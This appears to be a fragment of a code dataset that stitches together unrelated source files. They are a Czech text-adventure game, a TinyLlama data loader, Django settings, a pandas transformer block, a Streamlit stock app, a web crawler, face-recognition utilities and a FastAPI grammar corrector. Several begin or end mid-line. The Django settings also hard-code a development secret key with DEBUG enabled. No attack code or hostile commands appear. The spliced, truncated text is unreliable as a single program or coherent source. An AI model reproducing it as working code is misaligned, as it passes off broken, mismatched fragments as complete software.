(clickbait - corrupted)\n#TODO easter eggs: JS, SolidWorks\n\nprint(\"\"\"\n _____           _     _         _         _       _    \n|_   _| __ _   _| |__ | | _____ | | ___ __| |_ ___| | __\n  | || '__| | | | '_ \\| |/ / _ \\| |/ / '__| __/ _ \\ |/ /\n  | || |  | |_| | |_) |   < (_) |   <| |  | ||  __/   < \n  |_||_|   \\__,_|_.__/|_|\\_\\___/|_|\\_\\_|   \\__\\___|_|\\_\\ \"\"\")\nt.sleep(5)\nprint(\"\"\"\n                                _                       \n _ __  _ __ ___  ___  ___ _ __ | |_ ___                 \n| '_ \\| '__/ _ \\/ __|/ _ \\ '_ \\| __/ __|                \n| |_) | | |  __/\\__ \\  __/ | | | |_\\__ \\_ _ _           \n| .__/|_|  \\___||___/\\___|_| |_|\\__|___(_|_|_)          \n|_|       \"\"\")\nt.sleep(5)\nprint(\"\"\"\n ____        _____    _        _____ _   _ _            \n/ ___|  ___ | ____|  / \\   _  |_   _| | | | |           \n\\___ \\ / _ \\|  _|   / _ \\ (_)   | | | | | | |           \n ___) | (_) | |___ / ___ \\ _    | | | |_| | |___        \n|____/ \\___/|_____/_/   \\_(_)   |_|  \\___/|_____|\"\"\")\n\nprint(\"\"\"Ahoj, pr\u00e1v\u011b ses probudil na TULce.\n      Nev\u00ed\u0161 jak jsi se sem dostal, ale vedle tebe na zemi je nakresleno n\u011bco jako pentagram a v ka\u017ed\u00e9m kruhu je po\u010d\u00edta\u010d, krom\u011b jednoho\"\"\")\n#? pd.play(scary_sound)\nprint(\"\"\"Co udel\u00e1\u0161? Ute\u010de\u0161, nebo se na to pod\u00edv\u00e1\u0161 zbl\u00edzka:\n        1 - Ute\u010du\n        2 - Pod\u00edv\u00e1m se na ten pentagram zbl\u00edzka\"\"\")\nanswer = input(\"Co tedy ud\u011bl\u00e1\u0161? 1 / 2: \")\nif answer == '1':\n    print(\"Vyb\u011bhne\u0161 z m\u00edstnosti s pentagramem k nelbli\u0161\u0161\u00edm dve\u0159\u00edm, ale zjist\u00ed\u0161, \u017ee dve\u0159e jsou zam\u010den\u00e9.\")\n    print(\"Pod\u00edv\u00e1\u0161 se bl\u00ed\u017ee na z\u00e1mek dve\u0159\u00ed a zjist\u00ed\u0161, \u017ee k jejich otev\u0159en\u00ed je pot\u0159eba legend\u00e1rn\u00ed kouzeln\u00e1 karta, kterou lze nal\u00e9st jen na jedin\u00e9m m\u00edst\u011b.\")\n    #? pd.play(dark_sourprise_sound)\n    print(\"V Petrov\u011b kapse.\")\n    #? pd.play(organ)\n    t.sleep(20)\n    print(\"Rozhodne\u0161 se, \u017ee pod\u00edv\u00e1\u0161 na ten pentagram a je\u0161t\u011b k tomu jsi vypot\u0159eboval 20 sekund sv\u00e9ho \u010dasu.\")\n    print(\"Kdy\u017e se pod\u00edv\u00e1\u0161 na ten pentagram, zjist\u00ed\u0161, \u017ee uprost\u0159ed se nach\u00e1z\u00ed trezor s n\u00e1pisem \\\"Petrova kapsa\\\".\")\n    print(\"P\u0159i je\u0161t\u011b jedn\u00e9 bli\u017e\u0161\u00ed prohl\u00eddce zjist\u00ed\u0161, \u017ee ka\u017ed\u00e9mu ze 4 po\u010d\u00edta\u010du v c\u00edpech pentagramu chyb\u00ed ur\u010dit\u00e9 \u010d\u00e1sti. A jeden po\u010d\u00edta\u010d chyb\u00ed kompletn\u011b.\")\n    print(\"Mimo jin\u00e9 zjist\u00ed\u0161 \u017ee do trezoru vedou 4 kabely od 4 c\u00edp\u016f pentagramu. Jeden kabel chyb\u00ed.\")\n    print(\"Jeden z po\u010d\u00edta\u010d\u016f m\u00e1 na sob\u011b nainstalovan\u00fd Windows11 a LabView 16 s n\u011bjak\u00fdm zvl\u00e1\u0161t\u00edm programem, ale nen\u00ed p\u0159ipojen\u00fd k trezoru.\")\n    print(\"Dal\u0161\u00ed je odhl\u00e1\u0161en\u00fd a ty se nem\u016f\u017ee\u0161 do n\u011bj p\u0159hl\u00e1sit a v dal\u0161\u00edm chyb\u00ed LabView.\")\n    print(\"Ten posledn\u00ed ti nejde zapnout, tak\u017ee p\u00e1tr\u00e1\u0161, pro\u010d ti nejde zapnout. A\u017e dojde\u0161 k zji\u0161t\u011bn\u00ed, \u017ee pojistka na elektrick\u00e9m veden\u00ed k tomu po\u010d\u00edta\u010di je sp\u00e1len\u00e1.\")\n    print(\"Zjistil si, \u017ee pot\u0159ebuje\u0161 naj\u00edt kabel, p\u0159ihla\u0161ovac\u00ed \u00fadaje, instala\u010dn\u00ed soubory pro LabView, n\u011bjak\u00fd dal\u0161\u00ed po\u010d\u00edta\u010d a pojistku.\")\n    print(\"Hodn\u011b \u0161t\u011bst\u00ed p\u0159i hran\u00ed t\u00e9to hry. Douf\u00e1m, \u017ee ho nebude\u0161 pot\u0159ebovat.\")\n    print(\"U\u017eij si hru!\")\n    #? pd.play(start_game)\n\nelif answer == '2':\n    #? pd.play(brave_music)\n    print(\"Zjist\u00ed\u0161, \u017ee uprost\u0159ed pentagramu se nach\u00e1z\u00ed trezor s n\u00e1pisem \\\"Petrova kapsa\\\"\")\n    #? pd.play(inteligent_music)\n    print(\"Pr\u00e1v\u011b ti do\u0161lo, \u017ee k \u00fat\u011bku potrebuje\u0161 legend\u00e1rn\u00ed kouzelnou kartu\")\n    print(\"P\u0159i je\u0161t\u011b jedn\u00e9 bli\u017e\u0161\u00ed prohl\u00eddce zjist\u00ed\u0161, \u017ee ka\u017ed\u00e9mu ze 4 po\u010d\u00edta\u010du v c\u00edpech pentagramu chyb\u00ed ur\u010dit\u00e9 \u010d\u00e1sti. A jeden po\u010d\u00edta\u010d chyb\u00ed kompletn\u011b.\")\n    print(\"Mimo jin\u00e9 zjist\u00ed\u0161 \u017ee do trezoru vedou 4 kabely od 4 c\u00edp\u016f pentagramu. Jeden kabel chyb\u00ed.\")\n    print(\"Jeden z po\u010d\u00edta\u010d\u016f m\u00e1 na sob\u011b nainstalovan\u00fd Windows11 a LabView 16 s n\u011bjak\u00fdm",
    "# Copyright Lightning AI. Licensed under the Apache License 2.0, see LICENSE file.\nfrom dataclasses import dataclass, field\nfrom pathlib import Path\nfrom typing import Optional, Union\n\nfrom torch.utils.data import DataLoader\n\nfrom litgpt import Tokenizer\nfrom litgpt.data import DataModule\n\n\n@dataclass\nclass TinyLlama(DataModule):\n    \"\"\"The TinyLlama data module is composed of a mix of SlimPajama and Starcoder data.\n\n    Provides training and validation streaming dataloaders that return batches of tokens.\n    \"\"\"\n\n    data_path: Union[str, Path] = Path(\"data/\")\n    \"\"\"The path to the data directory, containing two folders 'slimpajama' and 'starcoder'\n    which are the output of the preprocessing step done in advance. See the `tutorial/pretrain_tinyllama.md`\n    for instructions. The path can also be a remote path (e.g., s3://).\"\"\"\n    seed: int = 42\n    \"\"\"The random seed for shuffling the dataset.\"\"\"\n    num_workers: int = 8\n    \"\"\"How many DataLoader processes to use for loading.\"\"\"\n\n    batch_size: int = field(init=False, repr=False, default=1)\n    seq_length: int = field(init=False, repr=False, default=2048)\n\n    def __post_init__(self):\n        # Could be a remote path (s3://) or a local path\n        self.slimpajama_train = str(self.data_path).rstrip(\"/\") + \"/slimpajama/train\"\n        self.slimpajama_val = str(self.data_path).rstrip(\"/\") + \"/slimpajama/val\"\n        self.starcoder_train = str(self.data_path).rstrip(\"/\") + \"/starcoder\"\n\n    def connect(\n        self, tokenizer: Optional[Tokenizer] = None, batch_size: int = 1, max_seq_length: Optional[int] = None\n    ) -> None:\n        self.batch_size = batch_size\n        self.seq_length = max_seq_length + 1  # Increase by one because we need the next token as well\n\n    def prepare_data(self) -> None:\n        for path in (self.slimpajama_train, self.slimpajama_val, self.starcoder_train):\n            if not path.startswith(\"s3://\") and not Path(path).is_dir():\n                raise FileNotFoundError(\n                    \"The data path for TinyLlama is expected to be the directory containing these subdirectories:\"\n                    f\" `slimpajama/train`, `slimpajama/val`, `starcoder`. The directory {path} does not exist.\"\n                    \" Set it via `--data.data_path=...`\"\n                )\n\n    def train_dataloader(self) -> DataLoader:\n        from litdata.streaming import CombinedStreamingDataset, StreamingDataLoader, StreamingDataset, TokensLoader\n\n        train_datasets = [\n            StreamingDataset(\n                input_dir=self.slimpajama_train,\n                item_loader=TokensLoader(block_size=self.seq_length),\n                shuffle=True,\n                drop_last=True,\n            ),\n            StreamingDataset(\n                input_dir=self.starcoder_train,\n                item_loader=TokensLoader(block_size=self.seq_length),\n                shuffle=True,\n                drop_last=True,\n            ),\n        ]\n\n        # Mix SlimPajama data and Starcoder data with these proportions:\n        weights = (0.693584, 0.306416)\n        combined_dataset = CombinedStreamingDataset(datasets=train_datasets, seed=self.seed, weights=weights)\n        train_dataloader = StreamingDataLoader(\n            combined_dataset, batch_size=self.batch_size, pin_memory=True, num_workers=self.num_workers, drop_last=True\n        )\n        return train_dataloader\n\n    def val_dataloader(self) -> DataLoader:\n        from litdata.streaming import StreamingDataset, TokensLoader\n\n        val_dataset = StreamingDataset(\n            input_dir=self.slimpajama_val,\n            item_loader=TokensLoader(block_size=self.seq_length),\n            shuffle=True,\n            # Consider setting to False, but we would lose some samples due to truncation when world size > 1\n            drop_last=True,\n        )\n        val_dataloader = DataLoader(\n            val_dataset, batch_size=self.batch_size, pin_memory=True, num_workers=self.num_workers, drop_last=True\n        )\n        return val_dataloader\n",
    "\"\"\"\nDjango settings for MetamaterialAntennas project.\n\nGenerated by 'django-admin startproject' using Django 5.0.3.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/5.0/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/5.0/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/5.0/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'django-insecure-_(#&l-nr1tl^r!l@@ph_xxh87)arv$ou2wgqlp90=c0uk$fd-o'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    \"optimizationapp\",\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'MetamaterialAntennas.urls'\nTEMPLATES_DIR = BASE_DIR/\"templates\"\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [TEMPLATES_DIR],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'MetamaterialAntennas.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/5.0/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR / 'db.sqlite3',\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/5.0/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/5.0/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/5.0/howto/static-files/\n\nSTATIC_URL = 'static/'\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/5.0/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n",
    "import pandas as pd\nif 'transformer' not in globals():\n    from mage_ai.data_preparation.decorators import transformer\nif 'test' not in globals():\n    from mage_ai.data_preparation.decorators import test\n\n\n@transformer\ndef transform(data, *args, **kwargs):\n    \"\"\"\n    Template code for a transformer block.\n\n    Add more parameters to this function if this block has multiple parent blocks.\n    There should be one parameter for each output variable from each parent block.\n\n    Args:\n        data: The output from the upstream parent block\n        args: The output from any additional upstream blocks (if applicable)\n\n    Returns:\n        Anything (e.g. data frame, dictionary, array, int, str, etc.)\n    \"\"\"\n    data_fixed = data.join(pd.json_normalize(data['node'])).drop('node', axis='columns')\n\n    data_fixed = data_fixed.explode('topics.edges', ignore_index=True)\n    data_fixed = data_fixed.join(pd.json_normalize(data_fixed['topics.edges'])).drop('topics.edges', axis='columns')\n    data_fixed.rename(columns={'node.createdAt':'topic_createdAt', 'node.id': 'topic_id', 'node.name': 'topic_name' }, inplace=True)\n\n    ph_posts_dtypes = {\n        'cursor': str,\n        'commentsCount': pd.Int64Dtype(),\n        'description': str, \n        'id': pd.Int64Dtype(),\n        'name': str,\n        'slug': str,\n        'tagline': str,\n        'url': str,\n        'userId': pd.Int64Dtype(), \n        'votesCount': pd.Int64Dtype(),\n        'website': str,\n        'topic_id': pd.Int64Dtype(), \n        'topic_name': str\n    }\n\n    parse_dates = ['createdAt', 'topic_createdAt']\n\n    data_fixed = data_fixed.astype(ph_posts_dtypes)\n\n    data_fixed['createdAt'] = pd.to_datetime(data_fixed['createdAt'])\n    data_fixed['topic_createdAt'] = pd.to_datetime(data_fixed['topic_createdAt'])\n\n    print(len(data_fixed))\n    \n    return data_fixed\n\n\n@test\ndef test_output(output, *args) -> None:\n    \"\"\"\n    Template code for testing the output of the block.\n    \"\"\"\n    assert output is not None, 'The output is undefined'\n",
    "import streamlit as st\nimport csv, requests, json\nfrom datetime import date\nfrom audiorecorder import audiorecorder\nfrom fuzzywuzzy import process\nimport plotly.graph_objects as go\n\nurl = st.secrets[\"url\"]\nstocks = json.load(open(\"stocks.json\"))\n\nst.session_state[\"ticker\"] = None\nst.session_state[\"news\"] = None\nst.session_state[\"summary\"] = None\nst.session_state[\"model\"] = \"@hf/thebloke/zephyr-7b-beta-awq\"\nst.session_state[\"date\"] = \"2024-04-12\"\n\n\nwith st.sidebar:\n    with st.form(\"Settings \u2699\ufe0f\"):\n        model = st.selectbox(\n            \"Select a Model \ud83e\udd16\",\n            [\n                \"@hf/thebloke/zephyr-7b-beta-awq\",\n                \"@cf/qwen/qwen1.5-0.5b-chat\",\n                \"@hf/nexusflow/starling-lm-7b-beta\",\n                \"@hf/thebloke/llamaguard-7b-awq\",\n                \"@hf/thebloke/neural-chat-7b-v3-1-awq\",\n                \"@cf/meta/llama-2-7b-chat-fp16\",\n                \"@cf/mistral/mistral-7b-instruct-v0.1\",\n                \"@cf/tinyllama/tinyllama-1.1b-chat-v1.0\",\n                \"@hf/mistral/mistral-7b-instruct-v0.2\",\n                \"@hf/thebloke/codellama-7b-instruct-awq\",\n                \"@hf/mistralai/mistral-7b-instruct-v0.2\",\n                \"@cf/thebloke/discolm-german-7b-v1-awq\",\n                \"@cf/meta/llama-2-7b-chat-int8\",\n                \"@hf/thebloke/mistral-7b-instruct-v0.1-awq\",\n                \"@hf/thebloke/openchat_3.5-awq\",\n                \"@cf/qwen/qwen1.5-7b-chat-awq\",\n                \"@hf/thebloke/llama-2-13b-chat-awq\",\n                \"@hf/thebloke/openhermes-2.5-mistral-7b-awq\",\n                \"@cf/tiiuae/falcon-7b-instruct\",\n                \"@hf/nousresearch/hermes-2-pro-mistral-7b\",\n                \"@cf/qwen/qwen1.5-1.8b-chat\",\n                \"@cf/microsoft/phi-2\",\n                \"@hf/google/gemma-7b-it\",\n                \"@cf/qwen/qwen1.5-14b-chat-awq\",\n                \"@cf/openchat/openchat-3.5-0106\",\n                \"@cf/google/gemma-2b-it-lora\",\n                \"@cf/google/gemma-7b-it-lora\",\n            ],\n            placeholder=\"Select a Model\",\n        )\n        date = st.date_input(\n            \"Select Date \ud83d\udcc5\", value=date(2024, 4, 12), format=\"YYYY-MM-DD\"\n        )\n        submit = st.form_submit_button(\"Submit \u2705\")\n        if submit:\n            st.session_state[\"model\"] = model\n            st.session_state[\"date\"] = date\n\n\n# st.set_page_config(layout=\"wide\")\nst.title(\"Stonks App \ud83d\udcc8\ud83d\udcc9\")\n# with st.spinner('Wait for it...'):\n# time.sleep(5)\n\n\n@st.cache_data\ndef show_chart(ticker, date):\n    res = requests.get(f\"{url}chart_data\", params={\"ticker\": ticker, \"date\": date})\n    if res.status_code == 200:\n        stock_data = res.json()\n        fig = go.Figure(\n            data=[\n                go.Candlestick(\n                    x=stock_data[\"x\"],\n                    open=stock_data[\"open\"],\n                    high=stock_data[\"high\"],\n                    low=stock_data[\"low\"],\n                    close=stock_data[\"close\"],\n                )\n            ]\n        )\n        # fig.update_layout(xaxis_rangeslider_visible=False)\n\n        st.markdown(\"## Chart\")\n        st.plotly_chart(fig)\n    else:\n        st.write(\"Error in fetching chart\")\n\n\n@st.cache_data\ndef fetch_news():\n    res = requests.get(f\"{url}news\")\n    if res.status_code == 200:\n        return res.json()\n    else:\n        return [\n            {\n                \"article_url\": fake.url(),\n                \"description\": fake.paragraph(),\n                \"image_url\": fake.image(),\n                \"title\": fake.name(),\n                \"keywords\": fake.words(5),\n            }\n            for _ in range(3)\n        ]\n\n\ncol1, col2 = st.columns([3, 1])\n\nwith col1:\n    option = st.selectbox(\n        \"Select a stock\", stocks.keys(), index=None, placeholder=\"search for stock\"\n    )\n    if option:\n        st.session_state[\"ticker\"] = stocks[option]\n    if st.session_state[\"ticker\"]:\n        st.write(f\"You selected: {st.session_state['ticker']}\")\nwith col2:\n    st.write(\"\")\n    st.write(\"\")\n    audio = audiorecorder(\"\ud83c\udf99\ufe0f\", \"\ud83d\udeab\")\n    if len(audio) > 0:\n        text = \"\"\n        res = requests.get(f\"{url}whisper\", data=audio.export().read())\n        if res.status_code == 200:\n            text = res.json()[\"text\"]\n        else:\n            st.write(f\"Error: {res.status_code}\")\n        if text:\n            option = process.extractOne(text, stocks.keys())\n            if option:\n                st.session_state[\"ticker\"] = stocks[option[0]]\n                st.write(f\"You selected: {st.session_state['ticker']}\")\n\n\nif st.session_state[\"ticker\"]:\n    st.title(\"Summary\")\n    with st.container():\n        with st.spinner(text=\"Wait for Summary ... \ud83d\udd24\ud83d\udd20\"):\n            res = requests.get(\n                f\"{url}stocks/{st.session_state['ticker']}\",\n                params={\n                    \"date\": st.session_state[\"date\"],\n                    \"model\": st.session_state[\"model\"],\n                },\n            )\n            if res.status_code == 200:\n                st.session_state[\"summary\"] = res.text\n            else:\n        ",
    "import requests\nfrom bs4 import BeautifulSoup\nimport html2text\nimport json\nimport sys\nfrom urllib.parse import urlparse, urljoin\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.service import Service\nfrom webdriver_manager.chrome import ChromeDriverManager\nfrom selenium.webdriver.chrome.options import Options\nimport concurrent.futures\n\ndef html2markdown(html):\n    htmlformatter = html2text.HTML2Text()\n    htmlformatter.ignore_links = True\n    htmlformatter.ignore_images = True\n    htmlformatter.body_width = 0\n    return htmlformatter.handle(html)\n\ndef fetch_html(url, force_selenium=False):\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n        content_type = response.headers.get('Content-Type', '')\n        if 'text/html' in content_type:\n            html = response.text\n            if needs_selenium(html):\n                return fetch_with_selenium(url)\n            return html\n        else:\n            print(f\"Skipped non-HTML content at {url} (content type: {content_type})\")\n            return None\n    except requests.RequestException as e:\n        print(f\"Request failed for {url}: {e}\")\n        return None\n\ndef fetch_with_selenium(url):\n    options = Options()\n    options.headless = True\n    service = Service(ChromeDriverManager().install())\n    driver = webdriver.Chrome(service=service, options=options)\n    driver.get(url)\n    html = driver.page_source\n    driver.quit()\n    return html\n\ndef needs_selenium(html):\n    soup = BeautifulSoup(html, 'html.parser')\n    script_count = len(soup.find_all('script', {'src': True}))\n    return script_count > 5\n\ndef extract_metadata(soup, url):\n    title = soup.title.string if soup.title else \"No title\"\n    meta_description = soup.find(\"meta\", attrs={\"name\": \"description\"})\n    description = meta_description[\"content\"] if meta_description else \"\"\n    language = soup.html.attrs.get('lang', 'unknown')\n    return {\"title\": title, \"description\": description, \"language\": language, \"sourceURL\": url}\n\ndef convert_to_json(html, url):\n    soup = BeautifulSoup(html, 'html.parser')\n    markdown = html2markdown(html)\n    metadata = extract_metadata(soup, url)\n    return {\"content\": markdown, \"metadata\": metadata}\n\ndef crawl(url):\n    visited = set()\n    to_visit = set([url])\n    results = []\n    domain_name = urlparse(url).netloc\n    executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)\n    futures = {executor.submit(fetch_html, url): url for url in to_visit}\n\n    while futures:\n        done, _ = concurrent.futures.wait(futures, return_when=concurrent.futures.FIRST_COMPLETED)\n        for future in done:\n            html = future.result()\n            if html:\n                current_url = futures.pop(future)\n                visited.add(current_url)\n                print(f\"Fetching {current_url}\")\n                soup = BeautifulSoup(html, 'html.parser')\n                results.append(convert_to_json(html, current_url))\n\n                for link in soup.find_all('a', href=True):\n                    href = urljoin(current_url, link['href'])\n                    parsed_href = urlparse(href)\n                    if not parsed_href.fragment and not parsed_href.path.lower().endswith(('.pdf', '.jpg', '.png', '.gif')):\n                        if parsed_href.netloc == domain_name and href not in visited:\n                            futures[executor.submit(fetch_html, href)] = href\n\n    return results\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python script.py <starting URL>\")\n        sys.exit(1)\n\n    start_url = sys.argv[1]\n    domain_name = urlparse(start_url).netloc\n    json_output = crawl(start_url)\n    \n    with open(f\"{domain_name}.json\", \"w\") as f:\n        f.write(json.dumps(json_output, indent=4))\n\n    print(f\"Output written to {domain_name}.json\")\n",
    "import torch\nimport torchvision.transforms as transforms\nimport torch.nn.functional as F\n\nfrom .verification import evaluate\n\nfrom datetime import datetime\nimport matplotlib.pyplot as plt\n\nplt.switch_backend('agg')\nimport numpy as np\nfrom PIL import Image\nimport io\nimport os\n\n\n# Support: ['get_time', 'l2_norm', 'make_weights_for_balanced_classes', 'get_val_pair', 'get_val_data', 'separate_irse_bn_paras', 'separate_resnet_bn_paras', 'warm_up_lr', 'schedule_lr', 'de_preprocess', 'hflip_batch', 'ccrop_batch', 'gen_plot', 'perform_val', 'buffer_val', 'AverageMeter', 'accuracy']\n\n\ndef get_time():\n\treturn (str(datetime.now())[:-10]).replace(' ', '-').replace(':', '-')\n\n\ndef l2_norm(input, axis=1):\n\tnorm = torch.norm(input, 2, axis, True)\n\toutput = torch.div(input, norm)\n\n\treturn output\n\n\ndef make_weights_for_balanced_classes(images, nclasses):\n\t'''\n\t\tMake a vector of weights for each image in the dataset, based\n\t\ton class frequency. The returned vector of weights can be used\n\t\tto create a WeightedRandomSampler for a DataLoader to have\n\t\tclass balancing when sampling for a training batch.\n\t\t\timages - torchvisionDataset.imgs\n\t\t\tnclasses - len(torchvisionDataset.classes)\n\t\thttps://discuss.pytorch.org/t/balanced-sampling-between-classes-with-torchvision-dataloader/2703/3\n\t'''\n\tcount = [0] * nclasses\n\tfor item in images:\n\t\tcount[item[1]] += 1  # item is (img-data, label-id)\n\tweight_per_class = [0.] * nclasses\n\tN = float(sum(count))  # total number of images\n\tfor i in range(nclasses):\n\t\tweight_per_class[i] = N / float(count[i])\n\tweight = [0] * len(images)\n\tfor idx, val in enumerate(images):\n\t\tweight[idx] = weight_per_class[val[1]]\n\n\treturn weight\n\n\ndef get_val_pair(path, name):\n\tcarray = bcolz.carray(rootdir=os.path.join(path, name), mode='r')\n\tissame = np.load('{}/{}_list.npy'.format(path, name))\n\n\treturn carray, issame\n\n\ndef get_val_data(data_path):\n\tlfw, lfw_issame = get_val_pair(data_path, 'lfw')\n\tcfp_ff, cfp_ff_issame = get_val_pair(data_path, 'cfp_ff')\n\tcfp_fp, cfp_fp_issame = get_val_pair(data_path, 'cfp_fp')\n\tagedb_30, agedb_30_issame = get_val_pair(data_path, 'agedb_30')\n\tcalfw, calfw_issame = get_val_pair(data_path, 'calfw')\n\tcplfw, cplfw_issame = get_val_pair(data_path, 'cplfw')\n\tvgg2_fp, vgg2_fp_issame = get_val_pair(data_path, 'vgg2_fp')\n\n\treturn lfw, cfp_ff, cfp_fp, agedb_30, calfw, cplfw, vgg2_fp, lfw_issame, cfp_ff_issame, cfp_fp_issame, agedb_30_issame, calfw_issame, cplfw_issame, vgg2_fp_issame\n\n\ndef separate_irse_bn_paras(modules):\n\tif not isinstance(modules, list):\n\t\tmodules = [*modules.modules()]\n\tparas_only_bn = []\n\tparas_wo_bn = []\n\tfor layer in modules:\n\t\tif 'model' in str(layer.__class__):\n\t\t\tcontinue\n\t\tif 'container' in str(layer.__class__):\n\t\t\tcontinue\n\t\telse:\n\t\t\tif 'batchnorm' in str(layer.__class__):\n\t\t\t\tparas_only_bn.extend([*layer.parameters()])\n\t\t\telse:\n\t\t\t\tparas_wo_bn.extend([*layer.parameters()])\n\n\treturn paras_only_bn, paras_wo_bn\n\n\ndef separate_resnet_bn_paras(modules):\n\tall_parameters = modules.parameters()\n\tparas_only_bn = []\n\n\tfor pname, p in modules.named_parameters():\n\t\tif pname.find('bn') >= 0:\n\t\t\tparas_only_bn.append(p)\n\n\tparas_only_bn_id = list(map(id, paras_only_bn))\n\tparas_wo_bn = list(filter(lambda p: id(p) not in paras_only_bn_id, all_parameters))\n\n\treturn paras_only_bn, paras_wo_bn\n\n\ndef warm_up_lr(batch, num_batch_warm_up, init_lr, optimizer):\n\tfor params in optimizer.param_groups:\n\t\tparams['lr'] = batch * init_lr / num_batch_warm_up\n\n\n# print(optimizer)\n\n\ndef schedule_lr(optimizer):\n\tfor params in optimizer.param_groups:\n\t\tparams['lr'] /= 10.\n\n\tprint(optimizer)\n\n\ndef de_preprocess(tensor):\n\treturn tensor * 0.5 + 0.5\n\n\nhflip = transforms.Compose([\n\tde_preprocess,\n\ttransforms.ToPILImage(),\n\ttransforms.functional.hflip,\n\ttransforms.ToTensor(),\n\ttransforms.Normalize([0.5, 0.5, 0.5], [0.5, 0.5, 0.5])\n])\n\n\ndef hflip_batch(imgs_tensor):\n\thfliped_imgs = torch.empty_like(imgs_tensor)\n\tfor i, img_ten in enumerate(imgs_tensor):\n\t\thfliped_imgs[i] = hflip(img_ten)\n\n\treturn hfliped_imgs\n\n\nccrop = transforms.Compose([\n\tde_preprocess,\n\ttransforms.ToPILImage(),\n\ttransforms.Resize([128, 128]),  # smaller side resized\n\ttransforms.CenterCrop([112, 112]),\n\ttransforms.ToTensor(),\n\ttransforms.Normalize([0.5, 0.5, 0.5], [0.5, 0.5, 0.5])\n])\n\n\ndef ccrop_batch(imgs_tensor):\n\tccropped_imgs = torch.empty_like(imgs_tensor)\n\tfor i, img_ten in enumerate(imgs_tensor):\n\t\tccropped_imgs[i] = ccrop(img_ten)\n\n\treturn ccropped_imgs\n\n\ndef gen_plot(fpr, tpr):\n\t\"\"\"Create a pyplot plot and save to buffer.\"\"\"\n\tplt.figure()\n\tplt.xlabel(\"FPR\", fontsize=14)\n\tplt.ylabel(\"TPR\", fontsize=14)\n\tplt.title(\"ROC Curve\", fontsize=14)\n\tplot = plt.plot(fpr, tpr, linewidth=2)\n\tbuf = io.BytesIO()\n\tplt.savefig(buf, format='jpeg')\n\tbuf.seek(0)\n\tplt.close()\n\n\treturn buf\n\n\ndef perform_val(multi_gpu, device, embedding_size, batch_size, backbone, carray, issame, nrof_folds=10, tta=True):\n\tif multi_gpu:\n\t\tbackbone = backbone.module  # unpackage model from DataParallel\n\t\tbackbone = backbone.to(device)\n\telse:\n\t\tbackbone = backbone.to(de",
    "import re\nfrom fastapi import FastAPI\nfrom pydantic import BaseModel\nfrom transformers import pipeline\n\n# App Initialization\napp = FastAPI()\n\n# Model Configuration and Initialization - Cached globally\nchecker_model_name = \"textattack/roberta-base-CoLA\"\ncorrector_model_name = \"vennify/t5-base-grammar-correction\"\n\ndef initialize_models():\n    # We only need the corrector model as we are skipping the checks\n    corrector = pipeline(\"text2text-generation\", model=corrector_model_name, max_length=240)\n    return corrector\n\ncorrector = initialize_models()\n\n# Utility Functions\ndef split_text(text: str) -> list:\n    # Optimized regex: Making sure it's efficient and suited for purpose\n    sentences = re.split(r\"\\.\\s+(?=[A-Z])\", text)\n    sentence_batches = []\n    temp_batch = []\n    \n    for sentence in sentences:\n        temp_batch.append(sentence)\n        if len(temp_batch) >= 2 and len(temp_batch) <= 3 or sentence == sentences[-1]:\n            sentence_batches.append(temp_batch)\n            temp_batch = []\n    \n    return sentence_batches\n\n# Data Model\nclass Prompt(BaseModel):\n    text: str\n\n# API Endpoints\n@app.get(\"/\")\nasync def health_check():\n    return {\"status\": \"healthy\"}\n\n@app.post(\"/correct_grammar\")\nasync def correct_grammar(prompt: Prompt):\n    sentence_batches = split_text(prompt.text)\n    if not sentence_batches:\n        return {\"error\": \"No text provided for grammar correction\"}, 400\n\n    try:\n        corrected_text = []\n        for batch in sentence_batches:\n            raw_text = \" \".join(batch)\n            